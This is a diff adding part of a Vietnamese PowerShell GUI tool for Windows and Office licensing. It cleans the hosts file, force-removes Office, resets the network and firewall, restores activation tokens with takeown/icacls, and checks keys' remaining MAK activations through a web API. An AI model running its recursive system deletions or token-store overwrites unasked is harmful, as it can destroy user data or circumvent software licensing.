+            foreach ($pattern in $msDomainPatterns) { if ($line -match $pattern -and $line -notmatch "^\s*#") { $isBlocked = $true; $blockedLines += $line; break } }
+            if (-not $isBlocked) { $cleanLines += $line }
+        }
+        if ($blockedLines.Count -gt 0) {
+            foreach ($b in $blockedLines) { Write-Log "[CHẶN] $b" "WARN" }
+            try { Set-Content -Path $hostsPath -Value $cleanLines -Force; Write-Log "Đã xóa các dòng chặn khỏi file hosts!" "CLEAN" }
+            catch { Write-Log "Không thể lưu file hosts." "CRIT" }
+        } else { Write-Log "File hosts SẠCH." "CLEAN" }
+    } else { Write-Log "Không tìm thấy file hosts." "WARN" }
+}
+
+function Restart-LicensingServices {
+    $txtLog.Text = ""; Write-Log ">>> ĐANG KHỞI ĐỘNG LẠI DỊCH VỤ BẢN QUYỀN..." "INFO"
+    try { Stop-Service "sppsvc" -Force -ErrorAction SilentlyContinue; Start-Sleep -Ms 400; Start-Service "sppsvc" -ErrorAction Stop; Write-Log "Dịch vụ sppsvc đã restart." "CLEAN" } catch {}
+    try { if (Get-Service "osppsvc" -ErrorAction SilentlyContinue) { Stop-Service "osppsvc" -Force -ErrorAction SilentlyContinue; Start-Sleep -Ms 400; Start-Service "osppsvc" -ErrorAction Stop; Write-Log "Dịch vụ osppsvc đã restart." "CLEAN" } } catch {}
+    Write-Log "Hoàn tất khởi động lại dịch vụ!" "CLEAN"
+}
+
+function Invoke-ForceRemoveOffice {
+    $txtLog.Text = ""
+    $msg = "Bạn có CHẮC CHẮN muốn gỡ cài đặt và xóa tận gốc Microsoft Office không?`n`n" +
+           "Quy trình gỡ thông minh (Smart Uninstall) sẽ được áp dụng:`n" +
+           "1. Cố gắng chạy trình gỡ cài đặt chuẩn của Windows trước.`n" +
+           "2. Quét sâu và xóa sổ mọi file, thư mục, Registry còn sót lại.`n`n" +
+           "LƯU Ý QUAN TRỌNG: Quá trình quét sâu có thể XÓA MẤT CÁC PROFILE OUTLOOK CŨ và dữ liệu cấu hình ứng dụng nếu bạn chưa sao lưu. Hãy đảm bảo bạn đã Backup dữ liệu Outlook (file PST/OST) trước khi tiếp tục."
+    $confirm = [System.Windows.Forms.MessageBox]::Show($msg, "CẢNH BÁO: Xóa tận gốc Office & Dữ liệu", [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Warning)
+    if ($confirm -ne 'Yes') { Write-Log "Đã hủy thao tác xóa tận gốc Office." "INFO"; return }
+
+    Write-Log ">>> ĐANG KHỞI ĐỘNG TIẾN TRÌNH SMART UNINSTALL OFFICE..." "INFO"
+    
+    # Bước 1: Gỡ chuẩn
+    Write-Log "Đang tìm kiếm trình gỡ cài đặt chuẩn của Office trong hệ thống..." "INFO"
+    $uninstallPaths = @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
+    $foundUninstaller = $false
+    foreach ($up in $uninstallPaths) {
+        $officeKeys = Get-ChildItem -Path $up -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "O365" -or $_.Name -match "Office" -or $_.Name -match "ClickToRun" -or $_.Name -match "ProPlus" }
+        foreach ($key in $officeKeys) {
+            $uninstallString = (Get-ItemProperty -Path $key.PSPath -Name "UninstallString" -ErrorAction SilentlyContinue).UninstallString
+            if ($uninstallString) {
+                Write-Log "Đã tìm thấy trình gỡ cài đặt gốc. Đang khởi chạy..." "CLEAN"
+                Write-Log "Vui lòng làm theo các bước trên màn hình (nếu có) để gỡ Office..." "INFO"
+                $foundUninstaller = $true
+                try {
+                    $proc = Start-Process -FilePath "cmd.exe" -ArgumentList "/c ""$uninstallString""" -Wait -PassThru -WindowStyle Hidden
+                    Write-Log "Trình gỡ cài đặt gốc đã hoàn tất." "CLEAN"
+                } catch {
+                    Write-Log "Lỗi khi chạy trình gỡ gốc, tự động chuyển sang chế độ Force Remove..." "WARN"
+                }
+                break
+            }
+        }
+        if ($foundUninstaller) { break }
+    }
+    if (-not $foundUninstaller) { Write-Log "Không tìm thấy trình gỡ chuẩn, tiến hành dọn dẹp sâu..." "WARN" }
+
+    # Bước 2: Dừng dịch vụ & tiến trình
+    Write-Log "Đang dừng các dịch vụ nền của Office..." "INFO"
+    Stop-Service -Name "ClickToRunSvc" -Force -ErrorAction SilentlyContinue
+    Stop-Service -Name "osppsvc" -Force -ErrorAction SilentlyContinue
+    
+    Write-Log "Đang ép đóng các tiến trình Office đang chạy..." "INFO"
+    $procs = @("winword", "excel", "powerpnt", "outlook", "msaccess", "onenote", "mspub", "lync", "OfficeClickToRun", "OfficeC2RClient")
+    foreach ($p in $procs) { Stop-Process -Name $p -Force -ErrorAction SilentlyContinue }
+    Start-Sleep -Seconds 2
+
+    # Bước 3: Xóa thư mục
+    Write-Log "Đang dọn dẹp thư mục cài đặt Office (Bao gồm C2R, MSI, Repack)..." "INFO"
+    $folders = @(
+        "$env:ProgramFiles\Microsoft Office", 
+        "${env:ProgramFiles(x86)}\Microsoft Office", 
+        "$env:ProgramFiles\Common Files\Microsoft Shared\ClickToRun", 
+        "$env:ProgramFiles\Common Files\Microsoft Shared\OFFICE14",
+        "$env:ProgramFiles\Common Files\Microsoft Shared\OFFICE15",
+        "$env:ProgramFiles\Common Files\Microsoft Shared\OFFICE16",
+        "$env:ProgramData\Microsoft\ClickToRun",
+        "$env:ProgramData\Microsoft\Office"
+    )
+    foreach ($f in $folders) { if (Test-Path $f) { Remove-Item -Path $f -Recurse -Force -ErrorAction SilentlyContinue } }
+
+    # Bước 4: Xóa Registry
+    Write-Log "Đang quét sâu và dọn dẹp Registry của Office (2010-365)..." "INFO"
+    $regPaths = @(
+        "HKLM:\SOFTWARE\Microsoft\Office",
+        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Office",
+        "HKLM:\SOFTWARE\Microsoft\AppVISV",
+        "HKCU:\Software\Microsoft\Office"
+    )
+    foreach ($r in $regPaths) { if (Test-Path $r) { Remove-Item -Path $r -Recurse -Force -ErrorAction SilentlyContinue } }
+
+    # Bước 5: Gỡ UI Control Panel
+    Write-Log "Đang gỡ tàn dư thông tin cài đặt khỏi Control Panel..." "INFO"
+    foreach ($up in $uninstallPaths) {
+        Get-ChildItem -Path $up -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "O365" -or $_.Name -match "Office" -or $_.Name -match "ClickToRun" -or $_.Name -match "ProPlus" } | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    
+    Write-Log "HOÀN TẤT: Đã gỡ bỏ tận gốc toàn bộ tàn dư Office trên hệ thống!" "CLEAN"
+}
+
+function Invoke-ResetWU {
+    $txtLog.Text = ""; Write-Log "Đang làm sạch và Reset Windows Update..." "INFO"
+    Stop-Service wuauserv, cryptSvc, bits, msiserver -Force -ErrorAction SilentlyContinue
+    Rename-Item -Path "$env:windir\SoftwareDistribution" -NewName "SoftwareDistribution.old" -ErrorAction SilentlyContinue
+    Rename-Item -Path "$env:windir\System32\catroot2" -NewName "catroot2.old" -ErrorAction SilentlyContinue
+    Start-Service wuauserv, cryptSvc, bits, msiserver -ErrorAction SilentlyContinue
+    Write-Log "Đã Reset Windows Update thành công!" "CLEAN"
+}
+
+function Invoke-SystemRepair {
+    $txtLog.Text = ""; Write-Log "Đang chạy quét lỗi hệ thống SFC và DISM (Sẽ mất nhiều thời gian)..." "INFO"
+    Write-Log "Vui lòng xem tiến trình trên cửa sổ CMD vừa hiện..." "INFO"
+    $cmd = "cmd.exe /c echo Dang chay SFC... && sfc /scannow && echo Dang chay DISM... && dism /online /cleanup-image /restorehealth"
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmd" -Wait
+    Write-Log "Hoàn tất quét và sửa lỗi file hệ thống!" "CLEAN"
+}
+
+function Invoke-RegisterLicDLLs {
+    $txtLog.Text = ""; Write-Log "Đang đăng ký lại thư viện cấp phép (Licensing DLLs)..." "INFO"
+    $dlls = "slc.dll", "slcext.dll", "sppwmi.dll", "sppsvc.exe"
+    foreach ($dll in $dlls) {
+        Start-Process "regsvr32.exe" -ArgumentList "/s $dll" -Wait -WindowStyle Hidden
+    }
+    Start-Process "mofcomp.exe" -ArgumentList "$env:windir\System32\wbem\sppWmi.mof" -Wait -WindowStyle Hidden
+    Write-Log "Đăng ký lại Licensing DLLs và WMI thành công!" "CLEAN"
+}
+
+function Invoke-ResetNetwork {
+    $txtLog.Text = ""; Write-Log "Đang khởi chạy tiến trình Reset Network & Firewall toàn diện..." "INFO"
+    Write-Log "Quá trình này sẽ ngắt kết nối mạng trong vài giây..." "WARN"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    $commands = @(
+        "ipconfig /release",
+        "ipconfig /flushdns",
+        "ipconfig /registerdns",
+        "arp -d *",
+        "nbtstat -R",
+        "nbtstat -RR",
+        "netsh winsock reset",
+        "netsh int ip reset",
+        "netsh int tcp reset",
+        "netsh interface ipv4 reset",
+        "netsh interface ipv6 reset",
+        "netsh winhttp reset proxy",
+        "netsh advfirewall reset",
+        "certutil -urlcache * delete",
+        "ipconfig /renew"
+    )
+    
+    foreach ($c in $commands) {
+        Write-Log "Đang thực thi: $c" "INFO"
+        Start-Process -FilePath "cmd.exe" -ArgumentList "/c $c" -Wait -WindowStyle Hidden
+    }
+    
+    Write-Log "Hoàn tất dọn dẹp, cấp mới IP, Reset Winsock, TCP/IP, Proxy và Firewall!" "CLEAN"
+}
+
+function Invoke-BackupTokens {
+    if (-not $chkBackupTokens.Checked -and -not $chkBackupDrivers.Checked) {
+        Write-Log "Chưa chọn thành phần nào để sao lưu!" "WARN"; return
+    }
+    $dialog = New-Object System.Windows.Forms.FolderBrowserDialog
+    $dialog.Description = "Chọn thư mục lưu Backup"
+    if ($dialog.ShowDialog() -ne [System.Windows.Forms.DialogResult]::OK) { return }
+    $basePath = $dialog.SelectedPath
+    if ($chkBackupTokens.Checked) {
+        $backupPath = Join-Path $basePath "WinLic_Backup"; $sppPath = "$env:windir\System32\spp\store\2.0"
+        Write-Log "Đang chuẩn bị sao lưu Bản Quyền (Tokens)..." "INFO"
+        if (Test-Path $sppPath) {
+            if (-not (Test-Path $backupPath)) { New-Item -ItemType Directory -Force -Path $backupPath | Out-Null }
+            Stop-Service "sppsvc" -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 1
+            try { Copy-Item -Path "$sppPath\*" -Destination $backupPath -Recurse -Force -ErrorAction Stop; Write-Log "  -> Sao lưu Bản quyền THÀNH CÔNG!" "CLEAN" } catch { Write-Log "  -> Lỗi: $($_.Exception.Message)" "CRIT" }
+            Start-Service "sppsvc" -ErrorAction SilentlyContinue
+        }
+    }
+    if ($chkBackupDrivers.Checked) {
+        $driverPath = Join-Path $basePath "Drivers_Backup"
+        Write-Log "Đang xuất Drivers (Có thể mất vài phút)..." "INFO"
+        if (-not (Test-Path $driverPath)) { New-Item -ItemType Directory -Force -Path $driverPath | Out-Null }
+        try { $d = Start-Process "dism.exe" "/online /export-driver /destination:`"$driverPath`"" -Wait -WindowStyle Hidden -PassThru; if ($d.ExitCode -eq 0) { Write-Log "  -> Sao lưu Drivers THÀNH CÔNG!" "CLEAN" } else { Write-Log "  -> Lỗi Backup Drivers" "CRIT" } } catch { Write-Log "  -> Lỗi: $($_.Exception.Message)" "CRIT" }
+    }
+    Write-Log "Hoàn tất tiến trình sao lưu!" "INFO"
+}
+
+
+function Invoke-RestoreTokens {
+    if (-not $chkBackupTokens.Checked -and -not $chkBackupDrivers.Checked) {
+        Write-Log "Chưa chọn thành phần để phục hồi!" "WARN"; return
+    }
+    $dialog = New-Object System.Windows.Forms.FolderBrowserDialog
+    $dialog.Description = "Chọn thư mục GỐC chứa Backup"
+    if ($dialog.ShowDialog() -ne [System.Windows.Forms.DialogResult]::OK) { return }
+    $basePath = $dialog.SelectedPath
+    $confirm = [System.Windows.Forms.MessageBox]::Show("Xác nhận GHI ĐÈ phục hồi?", "Xác Nhận", [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question)
+    if ($confirm -ne "Yes") { return }
+    if ($chkBackupTokens.Checked) {
+        $backupPath = Join-Path $basePath "WinLic_Backup"; $sppPath = "$env:windir\System32\spp\store\2.0"
+        if (Test-Path $backupPath) {
+            Write-Log "Đang PHỤC HỒI Bản Quyền..." "INFO"
+            Stop-Service "sppsvc" -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2
+            try { Start-Process "cmd.exe" "/c takeown /f `"$sppPath`" /r /d y && icacls `"$sppPath`" /grant administrators:F /t" -Wait -WindowStyle Hidden; Copy-Item -Path "$backupPath\*" -Destination $sppPath -Recurse -Force -ErrorAction Stop; Write-Log "  -> Phục hồi Tokens THÀNH CÔNG!" "CLEAN" } catch { Write-Log "  -> Lỗi: $($_.Exception.Message)" "CRIT" }
+            Start-Service "sppsvc" -ErrorAction SilentlyContinue; Start-Sleep -Seconds 1; Invoke-CScript "$env:SystemRoot\System32\slmgr.vbs" "/ato" | Out-Null
+        }
+    }
+    if ($chkBackupDrivers.Checked) {
+        $driverPath = Join-Path $basePath "Drivers_Backup"
+        if (Test-Path $driverPath) {
+            Write-Log "Đang cài đặt lại Drivers (Có thể mất vài phút)..." "INFO"
+            try { Start-Process "pnputil.exe" "/add-driver `"$driverPath\*.inf`" /subdirs /install" -Wait -WindowStyle Hidden; Write-Log "  -> Phục hồi Drivers HOÀN TẤT! Vui lòng Restart máy" "CLEAN" } catch { Write-Log "  -> Lỗi: $($_.Exception.Message)" "CRIT" }
+        }
+    }
+    Write-Log "Hoàn tất phục hồi!" "INFO"
+}
+
+
+function Invoke-PIDChecker {
+    $k = $txtPIDKey.Text.Trim()
+    if (-not ($k -match "^[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$")) {
+        Write-Log "Định dạng Key kiểm tra không hợp lệ." "WARN"
+        return
+    }
+    
+    $txtLog.Text = ""
+    Write-Log "Đang gửi yêu cầu kiểm tra Key (PID Checker) lên Web API..." "INFO"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    try {
+        $apiUrl = "https://pidkey.com/api/check?key=$k"
+        $response = Invoke-RestMethod -Uri $apiUrl -Method Get -TimeoutSec 15 -ErrorAction Stop
+        
+        Write-Log "==== KẾT QUẢ KIỂM TRA KEY ====" "INFO"
+        Write-Log "Product Key: $k" "INFO"
+        if ($response.Description) { Write-Log "Phiên bản: $($response.Description)" "CLEAN" }
+        if ($response.SubType) { Write-Log "Loại Key (Channel): $($response.SubType)" "CLEAN" }
+        if ($response.MAKCount -ne $null) { Write-Log "Lượt kích hoạt còn lại (MAK Count): $($response.MAKCount)" "CLEAN" }
+        Write-Log "================================" "INFO"
+    } catch {
+        Write-Log "Lỗi kết nối hoặc API PID Checker tạm thời ngưng hoạt động." "CRIT"
+        Write-Log $_.Exception.Message "WARN"
+    }
+}
+
+function Invoke-HardwareScan {
+    $txtLog.Text = ""
+    Write-Log ">>> ĐANG QUÉT CẤU HÌNH HỆ THỐNG..." "INFO"
+    try {
+        $os = Get-CimInstance Win32_OperatingSystem
+        $cpu = Get-CimInstance Win32_Processor
+        $mainboard = Get-CimInstance Win32_BaseBoard
+        
+        $ramArr = Get-CimInstance Win32_PhysicalMemoryArray
+        $ramSticks = Get-CimInstance Win32_PhysicalMemory
+        $ram = $ramSticks | Measure-Object -Property Capacity -Sum
+        $ramGb = [Math]::Round($ram.Sum / 1GB, 2)
+        
+        $totalSlots = 0
+        if ($ramArr) { foreach ($r in $ramArr) { $totalSlots += $r.MemoryDevices } }
+        $usedSlots = @($ramSticks).Count
+        $freeSlots = if ($totalSlots -gt 0) { $totalSlots - $usedSlots } else { "Không rõ" }
+        
+        $vga = Get-CimInstance Win32_VideoController
+        
+        Write-Log "Hệ điều hành: $($os.Caption) $($os.OSArchitecture)" "CLEAN"
+        
+        $mainName = if ($mainboard.Product) { $mainboard.Product } else { "Không rõ" }
+        $mainMfg = if ($mainboard.Manufacturer) { $mainboard.Manufacturer } else { "Không rõ" }
+        try {
+            $serial = (Get-CimInstance Win32_BIOS -ErrorAction Stop).SerialNumber
+            if ($serial -and $serial -ne "System Serial Number" -and $serial -ne "To be filled by O.E.M.") { Write-Log "Serial Number (S/N): $serial" "CLEAN" }
+        } catch {}
+
+        Write-Log "Mainboard: $mainMfg - $mainName" "CLEAN"
+        
+        Write-Log "CPU: $($cpu.Name)" "CLEAN"
+        Write-Log "RAM: $ramGb GB (Đã cắm $usedSlots khe / Trống $freeSlots khe)" "CLEAN"
+        
+        Write-Log "VGA / Card đồ họa:" "CLEAN"
+        foreach ($v in $vga) {
+            $vram = ""
+            if ($v.AdapterRAM) { 
+                $vramGb = [Math]::Round($v.AdapterRAM / 1GB, 2)
+                $vramMb = [Math]::Round($v.AdapterRAM / 1MB, 0)
+                $vram = if ($vramGb -ge 1) { " - VRAM: $vramGb GB" } else { " - VRAM: $vramMb MB" }
+            }
+            Write-Log "  - $($v.Name)$vram" "CLEAN"
+        }
+
+        Write-Log "Ổ đĩa vật lý:" "CLEAN"
+        try {
+                    try {
+            $battery = Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue
+            if ($battery) {
+                Write-Log "Pin (Battery):" "CLEAN"
+                foreach ($b in $battery) {
+                    $status = if ($b.BatteryStatus -eq 2) { "Đang cắm sạc (AC)" } elseif ($b.BatteryStatus -eq 1) { "Đang dùng Pin" } else { "Không rõ" }
+                    $charge = if ($b.EstimatedChargeRemaining) { "$($b.EstimatedChargeRemaining)%" } else { "Không rõ" }
+                    Write-Log "  - Dung lượng hiện tại: $charge ($status)" "CLEAN"
+                }
+            }
+        } catch {}
+        $disks = Get-PhysicalDisk
+            foreach ($d in $disks) {
+                $size = [Math]::Round($d.Size / 1GB, 2)
+                $type = $d.MediaType
+                if ([string]::IsNullOrWhiteSpace($type) -or $type -eq "Unspecified") { $type = "Không xác định" }
+                Write-Log "  - $($d.FriendlyName) (Loại: $type - $size GB)" "CLEAN"
+            }
+        } catch {
+            Write-Log "  - (Không thể đọc thông tin SSD/HDD trên hệ thống này)" "WARN"
+        }
+
+        Write-Log "Hoàn tất quét cấu hình máy tính!" "INFO"
+    } catch {
+        Write-Log "Lỗi quét cấu hình: $($_.Exception.Message)" "CRIT"
+    }
+}
+
+# --- THIẾT LẬP TAB CONTROL ---
+$tabControl = New-Object System.Windows.Forms.TabControl
+$tabControl.Location = New-Object System.Drawing.Point(20, 300)
+$tabControl.Size = New-Object System.Drawing.Size(845, 410)
+$tabControl.Font = $fontSection
+
+# TAB 1: Quản lý & Kích hoạt Online
+$tab1 = New-Object System.Windows.Forms.TabPage
+$tab1.Text = "1. Nạp Key Online & Quét"
+$tab1.BackColor = [System.Drawing.Color]::White
+
+$lblKey = New-Object System.Windows.Forms.Label
+$lblKey.Text = "Nhập Product Key (25 Ký tự, dạng XXXXX-XXXXX-...):"
+$lblKey.Location = New-Object System.Drawing.Point(15, 20)
+$lblKey.AutoSize = $true
+$tab1.Controls.Add($lblKey)
+
+$txtKey = New-Object System.Windows.Forms.TextBox
+$txtKey.Location = New-Object System.Drawing.Point(15, 45)
+$txtKey.Size = New-Object System.Drawing.Size(800, 28)
+$txtKey.Font = $fontCode
+$txtKey.CharacterCasing = 'Upper'
+$tab1.Controls.Add($txtKey)
+
+$btnWidth = 390; $btnHeight = 45
+$btnScan = New-Object System.Windows.Forms.Button
+$btnScan.Text = "Quét Bản Quyền (Win & Office)"
+$btnScan.Location = New-Object System.Drawing.Point(15, 90)
+$btnScan.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnScan.BackColor = [System.Drawing.Color]::FromArgb(21, 101, 192); $btnScan.ForeColor = [System.Drawing.Color]::White; $btnScan.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnScan.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnScan.Add_Click({ Toggle-Buttons $false; Invoke-LicenseScan; Toggle-Buttons $true }); $tab1.Controls.Add($btnScan); $allButtons += $btnScan
+
+$btnInstallWin = New-Object System.Windows.Forms.Button
+$btnInstallWin.Text = "Nạp Key Windows (Online)"
+$btnInstallWin.Location = New-Object System.Drawing.Point(15, 145)
+$btnInstallWin.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnInstallWin.BackColor = [System.Drawing.Color]::FromArgb(46, 125, 50); $btnInstallWin.ForeColor = [System.Drawing.Color]::White; $btnInstallWin.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnInstallWin.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnInstallWin.Add_Click({ Toggle-Buttons $false; Install-WinKeyOnline; Toggle-Buttons $true }); $tab1.Controls.Add($btnInstallWin); $allButtons += $btnInstallWin
+
+$btnClearWin = New-Object System.Windows.Forms.Button
+$btnClearWin.Text = "Xóa Key / Crack Windows"
+$btnClearWin.Location = New-Object System.Drawing.Point(15, 200)
+$btnClearWin.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnClearWin.BackColor = [System.Drawing.Color]::FromArgb(198, 40, 40); $btnClearWin.ForeColor = [System.Drawing.Color]::White; $btnClearWin.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnClearWin.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnClearWin.Add_Click({ Toggle-Buttons $false; Clear-WinLicenses; Toggle-Buttons $true }); $tab1.Controls.Add($btnClearWin); $allButtons += $btnClearWin
+
+# Cột 2
+$col2 = 425
+
+$btnScanHardware = New-Object System.Windows.Forms.Button
+$btnScanHardware.Text = "Quét Cấu Hình Máy Tính"
+$btnScanHardware.Location = New-Object System.Drawing.Point($col2, 90)
+$btnScanHardware.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnScanHardware.BackColor = [System.Drawing.Color]::FromArgb(230, 81, 0); $btnScanHardware.ForeColor = [System.Drawing.Color]::White; $btnScanHardware.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnScanHardware.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnScanHardware.Add_Click({ Toggle-Buttons $false; Invoke-HardwareScan; Toggle-Buttons $true }); $tab1.Controls.Add($btnScanHardware); $allButtons += $btnScanHardware
+
+$btnInstallOffice = New-Object System.Windows.Forms.Button
+$btnInstallOffice.Text = "Nạp Key Office (Online)"
+$btnInstallOffice.Location = New-Object System.Drawing.Point($col2, 145)
+$btnInstallOffice.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnInstallOffice.BackColor = [System.Drawing.Color]::FromArgb(0, 150, 136); $btnInstallOffice.ForeColor = [System.Drawing.Color]::White; $btnInstallOffice.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnInstallOffice.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnInstallOffice.Add_Click({ Toggle-Buttons $false; Install-OfficeKeyOnline; Toggle-Buttons $true }); $tab1.Controls.Add($btnInstallOffice); $allButtons += $btnInstallOffice
+
+$btnClearOffice = New-Object System.Windows.Forms.Button
+$btnClearOffice.Text = "Xóa Bản Quyền / Crack Office"
+$btnClearOffice.Location = New-Object System.Drawing.Point($col2, 200)
+$btnClearOffice.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnClearOffice.BackColor = [System.Drawing.Color]::FromArgb(173, 20, 87); $btnClearOffice.ForeColor = [System.Drawing.Color]::White; $btnClearOffice.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnClearOffice.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnClearOffice.Add_Click({ Toggle-Buttons $false; Clear-OfficeLicenses; Toggle-Buttons $true }); $tab1.Controls.Add($btnClearOffice); $allButtons += $btnClearOffice
+
+
+# TAB 2: Kích hoạt By Phone
+$tab2 = New-Object System.Windows.Forms.TabPage
+$tab2.Text = "2. Kích Hoạt By Phone"
+$tab2.BackColor = [System.Drawing.Color]::White
+
+$lblIID = New-Object System.Windows.Forms.Label
+$lblIID.Text = "Installation ID (IID):"
+$lblIID.Location = New-Object System.Drawing.Point(15, 20)
+$lblIID.AutoSize = $true
+$tab2.Controls.Add($lblIID)
+
+$txtIID = New-Object System.Windows.Forms.TextBox
+$txtIID.Location = New-Object System.Drawing.Point(15, 45)
+$txtIID.Size = New-Object System.Drawing.Size(390, 28)
+$txtIID.Font = $fontCode; $txtIID.ReadOnly = $true
+$tab2.Controls.Add($txtIID)
+
+$lblCID = New-Object System.Windows.Forms.Label
+$lblCID.Text = "Confirmation ID (CID):"
+$lblCID.Location = New-Object System.Drawing.Point($col2, 20)
+$lblCID.AutoSize = $true
+$tab2.Controls.Add($lblCID)
+
+$txtCID = New-Object System.Windows.Forms.TextBox
+$txtCID.Location = New-Object System.Drawing.Point($col2, 45)
+$txtCID.Size = New-Object System.Drawing.Size(390, 28)
+$txtCID.Font = $fontCode
+$txtCID.Add_TextChanged({
+    $clean = $txtCID.Text -replace '\D', ''
+    if ($clean.Length -gt 48) { $clean = $clean.Substring(0, 48) }
+    if ($txtCID.Text -ne $clean) { $pos = $txtCID.SelectionStart; $txtCID.Text = $clean; $txtCID.SelectionStart = [Math]::Min($pos, $txtCID.Text.Length) }
+})
+$tab2.Controls.Add($txtCID)
+
+$btnAutoWinPhone = New-Object System.Windows.Forms.Button
+$btnAutoWinPhone.Text = "Auto Active Windows (1-Click)"
+$btnAutoWinPhone.Location = New-Object System.Drawing.Point(15, 90)
+$btnAutoWinPhone.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnAutoWinPhone.BackColor = [System.Drawing.Color]::FromArgb(46, 125, 50); $btnAutoWinPhone.ForeColor = [System.Drawing.Color]::White; $btnAutoWinPhone.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnAutoWinPhone.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnAutoWinPhone.Add_Click({ Toggle-Buttons $false; Invoke-AutoWinPhone; Toggle-Buttons $true }); $tab2.Controls.Add($btnAutoWinPhone); $allButtons += $btnAutoWinPhone
+
+$btnAutoOfficePhone = New-Object System.Windows.Forms.Button
+$btnAutoOfficePhone.Text = "Auto Active Office (1-Click)"
+$btnAutoOfficePhone.Location = New-Object System.Drawing.Point($col2, 90)
+$btnAutoOfficePhone.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnAutoOfficePhone.BackColor = [System.Drawing.Color]::FromArgb(46, 125, 50); $btnAutoOfficePhone.ForeColor = [System.Drawing.Color]::White; $btnAutoOfficePhone.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnAutoOfficePhone.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnAutoOfficePhone.Add_Click({ Toggle-Buttons $false; Invoke-AutoOfficePhone; Toggle-Buttons $true }); $tab2.Controls.Add($btnAutoOfficePhone); $allButtons += $btnAutoOfficePhone
+
+$btnGetWinIID = New-Object System.Windows.Forms.Button
+$btnGetWinIID.Text = "Lấy IID Windows (Thủ công)"
+$btnGetWinIID.Location = New-Object System.Drawing.Point(15, 145)
+$btnGetWinIID.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnGetWinIID.BackColor = [System.Drawing.Color]::FromArgb(0, 131, 143); $btnGetWinIID.ForeColor = [System.Drawing.Color]::White; $btnGetWinIID.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnGetWinIID.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnGetWinIID.Add_Click({ Toggle-Buttons $false; Get-WinIID; Toggle-Buttons $true }); $tab2.Controls.Add($btnGetWinIID); $allButtons += $btnGetWinIID
+
+$btnGetOfficeIID = New-Object System.Windows.Forms.Button
+$btnGetOfficeIID.Text = "Lấy IID Office (Thủ công)"
+$btnGetOfficeIID.Location = New-Object System.Drawing.Point($col2, 145)
+$btnGetOfficeIID.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnGetOfficeIID.BackColor = [System.Drawing.Color]::FromArgb(55, 71, 79); $btnGetOfficeIID.ForeColor = [System.Drawing.Color]::White; $btnGetOfficeIID.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnGetOfficeIID.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnGetOfficeIID.Add_Click({ Toggle-Buttons $false; Get-OfficeIID; Toggle-Buttons $true }); $tab2.Controls.Add($btnGetOfficeIID); $allButtons += $btnGetOfficeIID
+
+$btnInstallWinCID = New-Object System.Windows.Forms.Button
+$btnInstallWinCID.Text = "Nạp CID Windows (Thủ công)"
+$btnInstallWinCID.Location = New-Object System.Drawing.Point(15, 200)
+$btnInstallWinCID.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
+$btnInstallWinCID.BackColor = [System.Drawing.Color]::FromArgb(0, 131, 143); $btnInstallWinCID.ForeColor = [System.Drawing.Color]::White; $btnInstallWinCID.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat; $btnInstallWinCID.Cursor = [System.Windows.Forms.Cursors]::Hand
+$btnInstallWinCID.Add_Click({ Toggle-Buttons $false; Install-WinCID; Toggle-Buttons $true }); $tab2.Controls.Add($btnInstallWinCID); $allButtons += $btnInstallWinCID
+
+$btnInstallOfficeCID = New-Object System.Windows.Forms.Button
+$btnInstallOfficeCID.Text = "Nạp CID Office (Thủ công)"
+$btnInstallOfficeCID.Location = New-Object System.Drawing.Point($col2, 200)
+$btnInstallOfficeCID.Size = New-Object System.Drawing.Size($btnWidth, $btnHeight)
